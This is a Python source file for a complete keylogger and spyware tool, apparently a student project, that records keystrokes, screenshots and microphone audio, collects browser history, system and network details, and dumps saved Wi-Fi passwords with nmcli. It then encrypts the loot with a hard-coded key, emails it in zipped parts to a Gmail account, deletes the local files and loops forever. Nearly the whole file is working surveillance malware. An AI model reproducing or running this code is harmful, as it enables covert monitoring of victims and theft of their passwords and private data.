# pylint: disable=E1101,I1101,W0106
# Szor, Peter (2005). The Art of Computer Virus Research and Defense
# https://www.researchgate.net/figure/Examples-of-viruses-string-signature_tbl1_235641042
# https://www.fortinet.com/resources/cyberglossary/heuristic-analysis
# https://usa.kaspersky.com/resource-center/definitions/heuristic-analysis
# https://www.cyberdefensemagazine.com/advanced-malware-detection/
# https://cybr.com/ethical-hacking-archives/how-i-made-a-python-keylogger-that-sends-emails/
# https://github.com/TheBugFather/Advanced-Keylogger
# https://www.udemy.com/course/complete-advance-ethical-hacking-keylogger-practical-cahkp/learn/lecture/25914430#overview
# https://github.com/kootenpv/yagmail
# https://github.com/certifi/python-certifi
# https://stackoverflow.com/questions/4166447/python-zipfile-module-doesnt-seem-to-be-compressing-my-files

import json
import logging
import os
import certifi
import yagmail
import ssl
import re
import shutil
import smtplib
import socket
import sys
import time
from email import encoders
from zipfile import ZipFile, ZIP_DEFLATED
import base64
from pathlib import Path
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from multiprocessing import Process
from pathlib import Path
from subprocess import CalledProcessError, check_output, Popen, TimeoutExpired
from threading import Thread
# External Modules #
import browserhistory as bh
from mss import mss
import cv2
import requests
import sounddevice
from cryptography.fernet import Fernet
# from PIL import ImageGrab
from pynput.keyboard import Listener








def send_mail(path: Path, re_obj: object):
    # Set certifi's certificates as the default for SSL connections
    ssl._create_default_https_context = lambda: ssl.create_default_context(cafile=certifi.where())

    yag = yagmail.SMTP('cs88keylogger@gmail.com', oauth2_file='~/oauth2_creds.json')

    body = "Mission is completed, here are the files."

    max_zip_size = 20 * 1024 * 1024  # 20 MB

    current_zip_files = []
    current_zip_size = 0
    zip_part_number = 1

    def send_current_zip():
        nonlocal zip_part_number, current_zip_files, current_zip_size
        if current_zip_files:
            zip_path = path / f"attachments_part_{zip_part_number}.zip"
            with ZipFile(zip_path, 'w', ZIP_DEFLATED) as zipf:
                for file in current_zip_files:
                    zipf.write(file, arcname=os.path.basename(file))

            yag.send(to='cs88keylogger@gmail.com', subject=f'Keylogger Data Part {zip_part_number}', contents=body, attachments=[zip_path])

            os.remove(zip_path)

            # Prepare for the next batch
            zip_part_number += 1
            current_zip_files = []
            current_zip_size = 0

    for file in os.scandir(path):
        if file.is_dir():
            continue
        if re_obj.re_xml.match(file.name) or re_obj.re_txt.match(file.name) or \
           re_obj.re_png.match(file.name) or re_obj.re_jpg.match(file.name) or \
           re_obj.re_audio.match(file.name):
            file_path = file.path
            file_size = os.path.getsize(file_path)

            # Check if it more that 20mb
            if current_zip_size + file_size > max_zip_size:
                send_current_zip()

            current_zip_files.append(file_path)
            current_zip_size += file_size

    send_current_zip()



def encrypt_data(files: list, export_path: Path):
    key = b'T2UnFbwxfVlnJ1PWbixcDSxJtpGToMKotsjR4wsSJpM='

    # Iterate through files to be encrypted #
    for file in files:
        # Format plain and crypt file paths #
        file_path = export_path / file
        crypt_path = export_path / f'e_{file}'
        try:
            # Read the file plain text data #
            with file_path.open('rb') as plain_text:
                data = plain_text.read()

            # Encrypt the file data #
            encrypted = Fernet(key).encrypt(data)

            # Write the encrypted data to fresh file #
            with crypt_path.open('wb') as hidden_data:
                hidden_data.write(encrypted)

            # Delete the plain text data #
            file_path.unlink()

        # If error occurs during file operation #
        except OSError as file_err:
            print_err(f'Error occurred during file operation: {file_err}')
            logging.exception('Error occurred during file operation: %s\n', file_err)


class RegObject:
    """
    Regex object that contains numerous compiled expressions grouped together.
    """
    def __init__(self):
        # Compile regex's for attaching files #
        self.re_xml = re.compile(r'.{1,255}\.xml$')
        self.re_txt = re.compile(r'.{1,255}\.txt$')
        self.re_png = re.compile(r'.{1,255}\.png$')
        self.re_jpg = re.compile(r'.{1,255}\.jpg$')
        self.re_audio = re.compile(r'.{1,255}\.mp4')





def microphone(mic_path: Path):
    # Import sound recording module in private thread #
    from scipy.io.wavfile import write as write_rec
    # Set recording frames-per-second and duration #
    frames_per_second = 44100
    seconds = 60

    for current in range(1, 6):
        channel = 1
        rec_name = mic_path / f'{current}mic_recording.mp4'

        # Initialize instance for microphone recording #
        my_recording = sounddevice.rec(int(seconds * frames_per_second),
                                       samplerate=frames_per_second, channels=channel)
        # Wait time interval for the mic to record #
        sounddevice.wait()

        # Save the recording as proper format based on OS #
        write_rec(str(rec_name), frames_per_second, my_recording)



def screenshot(screenshot_path: Path):
    screenshot_path.mkdir(parents=True, exist_ok=True)

    with mss() as sct:
        for current in range(1, 61):
            # Capture screenshot #
            filename = screenshot_path / f'{current}_screenshot.png'
            sct.shot(output=str(filename))

            # Sleep 5 seconds per iteration #
            time.sleep(5)



def log_keys(key_path: Path):
    logging.basicConfig(filename=key_path, level=logging.DEBUG,
                        format='%(asctime)s: %(message)s')
    # Join the keystroke listener thread #
    with Listener(on_press=lambda key: logging.info(str(key))) as listener:
        listener.join()


def get_browser_history(browser_file: Path):
    # Get the browser's username #
    bh_user = bh.get_username()
    # Gets path to database of browser #
    db_path = bh.get_database_paths()
    # Retrieves the user history #
    hist = bh.get_browserhistory()
    # Append the results into one list #
    browser_history = []
    browser_history.extend((bh_user, db_path, hist))

    try:
        # Write the results to output file in json format #
        with browser_file.open('w', encoding='utf-8') as browser_txt:
            browser_txt.write(json.dumps(browser_history))

    except OSError as file_err:
        print_err(f'Error occurred during file operation: {file_err}')
        logging.exception('Error occurred during browser history file operation: %s\n', file_err)

def get_system_info(sysinfo_file: Path):

    cmd0 = 'hostnamectl'
    cmd1 = 'lscpu'
    cmd2 = 'lsmem'
    cmd3 = 'lsusb'
    cmd4 = 'lspci'
    cmd5 = 'lshw'
    cmd6 = 'lsblk'
    cmd7 = 'df -h'

    syntax = f'{cmd0}; {cmd1}; {cmd2}; {cmd3}; {cmd4}; {cmd5}; {cmd6}; {cmd7}'

    try:
        # Setup system info gathering commands child process #
        with sysinfo_file.open('a', encoding='utf-8') as system_info:
            # Setup system info gathering commands child process #
            with Popen(syntax, stdout=system_info, stderr=system_info, shell=True) as get_sysinfo:
                # Execute child process #
                get_sysinfo.communicate(timeout=30)

    except OSError as file_err:
        print_err(f'Error occurred during file operation: {file_err}')
        logging.exception('Error occurred during file operation: %s\n', file_err)

    # If process error or timeout occurs #
    except TimeoutExpired:
        pass


def linux_wifi_query(export_path: Path):

    get_wifis = None
    # Format wifi output file path #
    wifi_path = export_path / 'wifi_info.txt'

    try:
        # Get the available Wi-Fi networks with  nmcli #
        get_wifis = check_output(['nmcli', '-g', 'NAME', 'connection', 'show'])

    # If error occurs during process #
    except CalledProcessError as proc_err:
        logging.exception('Error occurred during Wi-Fi SSID list retrieval: %s\n', proc_err)

    if get_wifis:
        # Iterate through command result line by line #
        for wifi in get_wifis.split(b'\n'):
            # If not a wired connection #
            if b'Wired' not in wifi:
                try:
                    # Open the network SSID list file in write mode #
                    with wifi_path.open('w', encoding='utf-8') as wifi_list:
                        # Setup nmcli wifi connection command child process #
                        with Popen(f'nmcli -s connection show {wifi}', stdout=wifi_list,
                                   stderr=wifi_list, shell=True) as command:
                            # Execute child process #
                            command.communicate(timeout=60)

                # If error occurs during file operation #
                except OSError as file_err:
                    print_err(f'Error occurred during file operation: {file_err}')
                    logging.exception('Error occurred during file operation: %s\n', file_err)

                # If process error or timeout occurs #
                except TimeoutExpired:
                    pass


def get_network_info(export_path: Path, network_file: Path):
    linux_wifi_query(export_path)

    cmd0 = 'ifconfig'
    cmd1 = 'arp -a'
    cmd2 = 'route'
    cmd3 = 'netstat -a'

        # Get the IP configuration & MAC address, ARP table,
        # routing table, and active TCP/UDP ports #
    syntax = f'{cmd0}; {cmd1}; {cmd2}; {cmd3}'

    try:
        # Open the network information file in write mode and log file in write mode #
        with network_file.open('w', encoding='utf-8') as network_io:
            try:
                # Setup network info gathering commands child process #
                with Popen(syntax, stdout=network_io, stderr=network_io, shell=True) as commands:
                    # Execute child process #
                    commands.communicate(timeout=60)

            # If execution timeout occurred #
            except TimeoutExpired:
                pass

            # Get the hostname #
            hostname = socket.gethostname()
            # Get the IP address by hostname #
            ip_addr = socket.gethostbyname(hostname)

            try:
                # Query ipify API to retrieve public IP #
                public_ip = requests.get('https://api.ipify.org').text

            # If error occurs querying public IP #
            except requests.ConnectionError as conn_err:
                public_ip = f'* Ipify connection failed: {conn_err} *'

            # Log the public and private IP address #
            network_io.write(f'[!] Public IP Address: {public_ip}\n'
                             f'[!] Private IP Address: {ip_addr}\n')

    except OSError as file_err:
        print_err(f'Error occurred during file operation: {file_err}')
        logging.exception('Error occurred during file operation: %s\n', file_err)


def main():

    export_path = Path('/tmp/logs/')


    export_path.mkdir(parents=True, exist_ok=True)
    # Set program files and dirs #
    network_file = export_path / 'network_info.txt'
    sysinfo_file = export_path / 'system_info.txt'
    browser_file = export_path / 'browser_info.txt'
    log_file = export_path / 'key_logs.txt'
    screenshot_dir = export_path / 'Screenshots'


    get_network_info(export_path, network_file)

    get_system_info(sysinfo_file)

    get_browser_history(browser_file)

    # Create and start processes #
    proc_1 = Process(target=log_keys, args=(log_file,))
    proc_1.start()
    proc_2 = Thread(target=screenshot, args=(screenshot_dir,))
    proc_2.start()
    proc_3 = Thread(target=microphone, args=(export_path,))
    proc_3.start()

    # Join threads with  timeout #
    proc_1.join(timeout=10)
    proc_2.join(timeout=10)
    proc_3.join(timeout=10)

    # Terminate process #
    proc_1.terminate()

    files = ['network_info.txt', 'system_info.txt', 'browser_info.txt', 'key_logs.txt']

    # Initialize compiled regex instance #
    regex_obj = RegObject()

    files.append('wifi_info.txt')

    encrypt_data(files, export_path)

    send_mail(export_path, regex_obj)
    send_mail(screenshot_dir, regex_obj)

    # Clean Up Files #
    shutil.rmtree(export_path)
    # Loop #
    main()


def print_err(msg: str):
    print(f'\n* [ERROR] {msg} *\n', file=sys.stderr)


if __name__ == '__main__':
    try:
        main()

    # If Ctrl + C is detected so that we can exit the program #
    except KeyboardInterrupt:
        print('* Control-C entered...Program exiting *')

    # If unknown exception occurs #
    except Exception as ex:
        print_err(f'Unknown exception occurred: {ex}')
        sys.exit(1)

    sys.exit(0)
